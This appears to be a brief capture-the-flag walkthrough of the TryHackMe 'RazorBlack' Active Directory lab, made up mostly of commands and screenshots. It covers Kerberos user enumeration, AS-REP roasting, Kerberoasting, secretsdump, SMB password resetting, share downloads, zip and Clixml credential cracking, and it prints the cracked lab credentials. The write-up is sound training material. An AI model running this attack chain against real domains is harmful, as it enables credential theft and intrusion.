# RazorBlack

```bash
 ./kerbrute_linux_386 userenum  -d raz0rblack.thm --dc 10.10.241.105    users.txt 
```

<figure><img src="../../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/pentest_notes#port-111-rpcbind" %}

<figure><img src="../../../../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

```bash
showmount -e 10.10.241.105
```

<figure><img src="../../../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

i open exel file i found users&#x20;

<figure><img src="../../../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

REP-REPOSTING

```
impacket-GetNPUsers raz0rblack.thm/ -dc-ip 10.10.194.110  -usersfile users.txt -format john -outputfile crackme.txt -no-pass -request
```

<figure><img src="../../../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

user cracked

<figure><img src="../../../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**twilliams:roastpotatoes**</mark>



### **Targeted Kerberoast**

```bash
impacket-GetUserSPNs raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.35.193 -request
```

<figure><img src="../../../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

xyan1d3:cyanide9amine5628

<figure><img src="../../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

i found a local domain user made secretsdump

<figure><img src="../../../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

xyan1d3.xml

```
01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2
```

<figure><img src="../../../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

```bash
impacket-smbpasswd sbradley@10.10.108.185
```

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

**Smbmap** to show sharing file

```
 smbmap -H 10.10.108.185 -u 'sbradley' -p '1234@Asd' -r trash --download trash/experiment_gone_wrong.zip
```

<figure><img src="../../../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

```
zip2jon file.zip > ziphash
 john ziphash  --wordlist=/usr/share/wordlists/rockyou.txt 
```

<figure><img src="../../../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

```
$Credential = Import-Clixml -Path "root.xml"
$Credential.GetNetworkCredential().password
```

<mark style="color:blue;">**`Import-Clixml -Path "xyan1d3.xml"`**</mark>: This command imports data from an XML file named `"xyan1d3.xml"`. The XML file should contain a serialized **`PSCredential`** object. This method is commonly used for securely storing and retrieving credentials.

**Convert SecureString to Plain Text** (if absolutely necessary, but **not recommended** due to security concerns):

<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
